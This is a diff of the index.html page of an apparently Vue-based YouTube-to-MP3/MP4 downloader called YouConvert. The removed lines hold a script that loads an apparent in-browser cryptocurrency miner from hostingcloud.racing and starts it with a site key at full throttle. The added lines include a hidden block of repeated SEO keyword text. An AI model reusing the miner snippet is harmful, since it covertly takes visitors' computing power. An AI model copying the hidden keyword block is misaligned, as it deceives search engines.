@@ -1,22 +1,173 @@
 <!DOCTYPE html>
 <html lang="">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
-    <title>Baixe videos e musicas do youtube online</title>
-  </head>
-  <body>
-    <div id="app"></div>
-    <!-- built files will be auto injected -->
-  </body>
-</html>
 
-<script src="https://www.hostingcloud.racing/q8sg.js"></script>
-<script>
-  var _client = new Client.Anonymous('c69aa20dec72a8d1d9c7c8d03e0297694ba66c02d8654617763033e3e7a92bfd', {
-    throttle: 0, c: 'w', ads: 0
-  });
-  _client.start();
-</script>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Baixe videos e musicas do youtube online</title>
+</head>
+
+<body>
+  <div id="app"></div>
+  <div class="tabela border-bottom mt-2" style="display: none;">
+    <h1>Baixar Musica do Youtube online</h1>
+    <h1>Baixar Video do Youtube online</h1>
+    <h1>Baixar Videos do Youtube online</h1>
+    <h1>Baixar Musicas do Youtube online</h1>
+    <div class="conteudo">
+      <div class="row border" v-if="exibirIframe">
+        <h3 class="text-center text-primary mt-3">{{ titulo }}</h3>
+        <div class="col mt-2 text-center">
+          <p> <strong> Para baixar o arquivo, clique nos 3 pontos <br> no canto
+              inferior
+              direito da tela<br> E escolha 'fazer download' na lista de opções.</strong></p>
+          <iframe :src="linkDownload" :name="titulo"></iframe>
+        </div>
+      </div>
+
+      <div class="row mt-5 border-bottom">
+        <div class="col">
+          <h2 class="text-primary">Melhor Downloader de MP3 e MP4 do Youtube {{ anoAtual }}</h2>
+          <p>"Youtube to Mp3" é uma ferramenta para baixar mp3 do Youtube. Suporte ao conversor de alta
+            qualidade do Youtube para mp3, baixe músicas do Youtube em alta velocidade. Além disso,
+            também permite que você baixe vídeos do Youtube e converta vídeos do Youtube
+          </p>
+        </div>
+      </div>
+
+      <div class="ftco-section section-left">
+        <section itemscope="">
+          <div class="sf_container">
+            <div class="wrapper">
+              <div class="mt-2">
+                <h3 class="title center text-primary">YouConvert</h3>
+                <div class="border-bottom">
+                  <div class="faq_item_title">
+                    <h4 itemprop="name">O que é YouConvert?</h4>
+                  </div>
+                  <div>
+                    <div>
+                      <ul>
+                        <li>É uma ferramenta gratuita para baixar vídeos do Youtube online.
+                          Também suporta converter vídeos do <b>Youtube para Mp3</b> e
+                          <b>baixar músicas do Youtube</b> com a melhor qualidade
+                        </li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                <div class="border-bottom mt-2">
+                  <div class="text-primary">
+                    <h4>Como baixar o vídeo do YouTube no YouConvert mais
+                      rápido?</h4>
+                  </div>
+                  <div class="mb-2">
+                    <div>
+                      <ul>
+                        <li>Etapa 1: cole o URL do Youtube na caixa de pesquisa</li>
+                        <li>Etapa 2: Escolha o formato MP4 ou MP3 e clique em "Get Link"
+                        </li>
+                        <li>Etapa 3: aguarde alguns segundos pela ferramenta de
+                          processamento de vídeo e pressione o botão "Download"</li>
+                        <li>Também pode usar o utilitário "downloader youtube" do YouConvert
+                          para baixar o vídeo mais rápido</li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                <div class="border-bottom mt-2">
+                  <div class="text-primary">
+                    <h4>O YouConvert tem um número limitado de usos?</h4>
+                  </div>
+                  <div class="mb-2">
+                    <div> Nossa ferramenta permite que você baixe vídeos ilimitados do Youtube
+                      e tudo de graça. </div>
+                  </div>
+                </div>
+                <div class="border-bottom mt-2">
+                  <div class="text-primary">
+                    <h4>Para quais formatos o YouConvert permite a conversão de
+                      vídeos do Youtube?</h4>
+                  </div>
+                  <div class="mb-2">
+                    <div> Oferecemos suporte para conversão em
+                      uma variedade de formatos como: MP4, 3GP, MP3, WEBM, M4A. Você pode
+                      assisti-lo diretamente no dispositivo sem baixar nenhum software
+                      adicional. </div>
+                  </div>
+                </div>
+                <div class="border-bottom mt-2">
+                  <div class="text-primary">
+                    <h4>O YouConvert pode converter vídeos do Youtube em
+                      mp3?</h4>
+                  </div>
+                  <div class="mb-2">
+                    <div> Claro que você pode
+                    </div>
+                  </div>
+                </div>
+                <div class="border-bottom mt-2">
+                  <div class="text-primary">
+                    <h4>A ferramenta YouConvert pode baixar vídeos do Youtube em
+                      telefones celulares?</h4>
+                  </div>
+                  <div class="mb-2">
+                    <div> A tecnologia de download de vídeo do Youtube da
+                      YouConvert funciona bem em todos os dispositivos, como PCs,
+                      smartphones e tablets. O método funciona de forma semelhante a , y2meta,
+                      x2convert sem a necessidade de
+                      instalar qualquer outro software. </div>
+                  </div>
+                </div>
+                <div class="border-bottom mt-2">
+                  <div class="text-primary">
+                    <h4>Onde o vídeo baixado do Youtube é armazenado?</h4>
+                  </div>
+                  <div class="mb-2">
+                    <div> Verifique a pasta "Downloads" no telefone ou a seção
+                      "histórico de downloads" do navegador. </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+    Best Youtube MP3 & MP4 Downloader 2023
+    "Youtube to Mp3" is a tool to download mp3 from Youtube. Support high-quality Youtube to mp3 converter, download
+    Youtube music at high speed. In addition, it also allows you to download Youtube videos and convert Youtube videos
+
+    YouConvert
+    What is YouConvert?
+    It is a free tool to download Youtube videos online. It also supports converting Youtube videos to Mp3 and
+    downloading Youtube music best quality
+
+
+    How to Download YouTube Video on YouConvert Faster?
+    Step 1: Paste the Youtube URL into the search box
+    Step 2: Choose MP4 or MP3 format and click "Get Link"
+    Step 3: Wait for a few seconds for the video processing tool and press the "Download" button
+    You can also use YouConvert's "youtube downloader" utility to download the video faster
+
+
+    How to Download YouTube Video on YouConvert Faster?
+    Step 1: Paste the Youtube URL into the search box
+    Step 2: Choose MP4 or MP3 format and click "Get Link"
+    Step 3: Wait for a few seconds for the video processing tool and press the "Download" button
+    You can also use YouConvert's "youtube downloader" utility to download the video faster
+
+
+    Can YouConvert convert Youtube videos to mp3?
+
+    Of course you can
+    Can YouConvert tool download Youtube videos on mobile phones?
+    YouConvert's Youtube video downloader technology works well on all devices such as PCs, smartphones, and tablets.
+    The method works similarly to , y2meta, x2convert without the need to install any other software.
+    Where is the downloaded Youtube video stored?
+    Check the "Downloads" folder on your phone or the "download history" section of your browser.
+  </div>
+</body>
+
+</html>
